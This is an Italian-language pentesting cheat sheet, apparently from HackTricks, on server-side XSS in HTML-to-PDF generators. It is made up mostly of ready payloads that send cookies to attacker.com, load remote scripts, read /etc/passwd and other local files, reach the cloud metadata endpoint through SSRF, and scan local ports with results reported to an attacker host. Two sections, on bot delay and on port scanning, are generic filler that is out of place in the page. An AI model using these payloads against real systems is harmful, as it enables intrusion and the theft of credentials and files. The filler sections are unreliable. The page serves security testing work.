# Server Side XSS (Dynamic PDF)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Server Side XSS (Dynamic PDF)

Se una pagina web crea un PDF utilizzando un input controllato dall'utente, puoi provare a **ingannare il bot** che sta creando il PDF per **eseguire codice JS arbitrario**.\
Quindi, se il **bot creatore di PDF trova** alcuni **tag HTML**, li **interpreta**, e puoi **sfruttare** questo comportamento per causare un **Server XSS**.

Si prega di notare che i tag `<script></script>` non funzionano sempre, quindi sar√† necessario un metodo diverso per eseguire JS (ad esempio, sfruttando `<img` ).\
Inoltre, nota che in un'exploitazione regolare sarai **in grado di vedere/scaricare il PDF creato**, quindi sarai in grado di vedere tutto ci√≤ che **scrivi tramite JS** (utilizzando ad esempio `document.write()`). Ma, se **non puoi vedere** il PDF creato, probabilmente dovrai **estrarre le informazioni effettuando una richiesta web a te** (Blind).

### Generazione PDF popolare

- **wkhtmltopdf** √® noto per la sua capacit√† di convertire HTML e CSS in documenti PDF, utilizzando il motore di rendering WebKit. Questo strumento √® disponibile come utility da riga di comando open-source, rendendolo accessibile per una vasta gamma di applicazioni.
- **TCPDF** offre una soluzione robusta nell'ecosistema PHP per la generazione di PDF. √à in grado di gestire immagini, grafica e crittografia, mostrando la sua versatilit√† nella creazione di documenti complessi.
- Per coloro che lavorano in un ambiente Node.js, **PDFKit** presenta un'opzione valida. Consente la generazione di documenti PDF direttamente da HTML e CSS, fornendo un ponte tra il contenuto web e i formati stampabili.
- Gli sviluppatori Java potrebbero preferire **iText**, una libreria che non solo facilita la creazione di PDF, ma supporta anche funzionalit√† avanzate come firme digitali e compilazione di moduli. Il suo set di funzionalit√† completo lo rende adatto per la generazione di documenti sicuri e interattivi.
- **FPDF** √® un'altra libreria PHP, caratterizzata dalla sua semplicit√† e facilit√† d'uso. √à progettato per sviluppatori che cercano un approccio diretto alla generazione di PDF, senza la necessit√† di funzionalit√† estese.


## Payloads

### Scoperta
```markup
<!-- Basic discovery, Write somthing-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<!--Basic blind discovery, load a resource-->
<img src="http://attacker.com"/>
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://attacker.com">
```
### SVG

Qualsiasi dei payload precedenti o seguenti pu√≤ essere utilizzato all'interno di questo payload SVG. Un iframe che accede al sottodominio Burpcollab e un altro che accede all'endpoint dei metadati sono forniti come esempi.
```markup
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
<g>
<foreignObject width="800" height="500">
<body xmlns="http://www.w3.org/1999/xhtml">
<iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
</body>
</foreignObject>
</g>
</svg>


<svg width="100%" height="100%" viewBox="0 0 100 100"
xmlns="http://www.w3.org/2000/svg">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>
<script type="text/javascript">
// <![CDATA[
alert(1);
// ]]>
</script>
</svg>
```
Puoi trovare molti **altri payload SVG** in [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

### Rivelazione del percorso
```markup
<!-- If the bot is accessing a file:// path, you will discover the internal path
if not, you will at least have wich path the bot is accessing -->
<img src="x" onerror="document.write(window.location)" />
<script> document.write(window.location) </script>
```
### Caricare uno script esterno

Il modo migliore per sfruttare questa vulnerabilit√† √® abusare della vulnerabilit√† per far caricare al bot uno script che controlli localmente. Successivamente, sarai in grado di modificare il payload localmente e farlo caricare al bot con lo stesso codice ogni volta.
```markup
<script src="http://attacker.com/myscripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
```
### Leggi file locale / SSRF

{% hint style="warning" %}
Cambia `file:///etc/passwd` con `http://169.254.169.254/latest/user-data` ad esempio per **provare ad accedere a una pagina web esterna (SSRF)**.

Se SSRF √® consentito, ma **non riesci a raggiungere** un dominio o un IP interessante, [controlla questa pagina per potenziali bypass](../ssrf-server-side-request-forgery/url-format-bypass.md).
{% endhint %}
```markup
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```markup
<script>
xhzeem = new XMLHttpRequest();
xhzeem.onload = function(){document.write(this.responseText);}
xhzeem.onerror = function(){document.write('failed!')}
xhzeem.open("GET","file:///etc/passwd");
xhzeem.send();
</script>
```

```markup
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
<embed src="file:///etc/passwd>" width="400" height="400">
<style><iframe src="file:///etc/passwd">
<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
```

```markup
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```
### Ritardo del bot

In alcuni casi, durante un attacco di hacking, potrebbe essere necessario introdurre un ritardo tra le richieste inviate dal bot. Questo pu√≤ essere fatto per vari motivi, come evitare di sovraccaricare il server bersaglio o evitare di attirare l'attenzione degli amministratori di sistema.

Per introdurre un ritardo nel bot, √® possibile utilizzare la funzione `sleep()` o un'altra funzione simile nel linguaggio di programmazione utilizzato per lo sviluppo del bot. Questa funzione consente di specificare il tempo di attesa tra le richieste.

Ad esempio, nel linguaggio Python, √® possibile utilizzare la libreria `time` per introdurre un ritardo nel bot. Di seguito √® riportato un esempio di codice che introduce un ritardo di 1 secondo tra le richieste:

```python
import time

# Codice per inviare richieste al server bersaglio
...

# Introduce un ritardo di 1 secondo
time.sleep(1)

# Invia la successiva richiesta al server bersaglio
...
```

√à importante notare che il ritardo deve essere impostato in modo appropriato in base alle esigenze specifiche dell'attacco. Un ritardo troppo breve potrebbe ancora sovraccaricare il server bersaglio, mentre un ritardo troppo lungo potrebbe rallentare l'attacco complessivo.

In conclusione, l'introduzione di un ritardo nel bot pu√≤ essere una strategia utile durante un attacco di hacking per evitare rilevamenti indesiderati e garantire un'efficace esecuzione dell'attacco.
```markup
<!--Make the bot send a ping every 500ms to check how long does the bot wait-->
<script>
let time = 500;
setInterval(()=>{
let img = document.createElement("img");
img.src = `https://attacker.com/ping?time=${time}ms`;
time += 500;
}, 500);
</script>
<img src="https://attacker.com/delay">
```
### Scansione delle porte

La scansione delle porte √® una tecnica utilizzata per identificare le porte aperte su un sistema remoto. Questo processo viene eseguito inviando pacchetti di rete a diverse porte e analizzando le risposte ricevute. La scansione delle porte pu√≤ essere utile durante un test di penetrazione per identificare servizi in ascolto e potenziali punti di ingresso per un attacco.

Esistono diversi tipi di scansione delle porte, tra cui:

- Scansione TCP: questa tecnica coinvolge l'invio di pacchetti TCP a diverse porte e l'analisi delle risposte ricevute. Pu√≤ essere utilizzata per identificare le porte aperte e i servizi in ascolto su un sistema remoto.

- Scansione UDP: questa tecnica coinvolge l'invio di pacchetti UDP a diverse porte e l'analisi delle risposte ricevute. Pu√≤ essere utilizzata per identificare le porte aperte e i servizi in ascolto su un sistema remoto che utilizza il protocollo UDP.

- Scansione delle porte comuni: questa tecnica coinvolge la scansione di un elenco predefinito di porte comuni utilizzate da molti servizi. Pu√≤ essere utile per identificare servizi noti su un sistema remoto.

La scansione delle porte pu√≤ essere eseguita utilizzando strumenti come Nmap, Masscan o Zmap. √à importante notare che la scansione delle porte pu√≤ essere considerata un'attivit√† intrusiva e pu√≤ violare le politiche di sicurezza di alcuni sistemi. Pertanto, √® consigliabile ottenere l'autorizzazione appropriata prima di eseguire una scansione delle porte su un sistema.
```markup
<!--Scan local port and receive a ping indicating which ones are found-->
<script>
const checkPort = (port) => {
fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
let img = document.createElement("img");
img.src = `http://attacker.com/ping?port=${port}`;
});
}

for(let i=0; i<1000; i++) {
checkPort(i);
}
</script>
<img src="https://attacker.com/startingScan">
```
### [SSRF](../ssrf-server-side-request-forgery/)

Questa vulnerabilit√† pu√≤ essere facilmente trasformata in un SSRF (poich√© √® possibile caricare risorse esterne tramite lo script). Quindi prova semplicemente a sfruttarla (leggere alcuni metadati?).

### Allegati: PD4ML

Ci sono alcuni motori HTML 2 PDF che consentono di **specificare allegati per il PDF**, come **PD4ML**. Puoi abusare di questa funzionalit√† per **allegare qualsiasi file locale** al PDF.\
Per aprire l'allegato ho aperto il file con **Firefox e ho fatto doppio clic sul simbolo della graffetta** per **salvare l'allegato** come nuovo file.\
Catturare la **risposta PDF** con Burp dovrebbe anche **mostrare l'allegato in testo chiaro** all'interno del PDF.

{% code overflow="wrap" %}
```html
<!-- From https://0xdf.gitlab.io/2021/04/24/htb-bucket.html -->
<html><pd4ml:attachment src="/etc/passwd" description="attachment sample" icon="Paperclip"/></html>
```
{% endcode %}

## Riferimenti

* [https://lbherrera.github.io/lab/h1415-ctf-writeup.html](https://lbherrera.github.io/lab/h1415-ctf-writeup.html)
* [https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
* [https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
* [https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c](https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
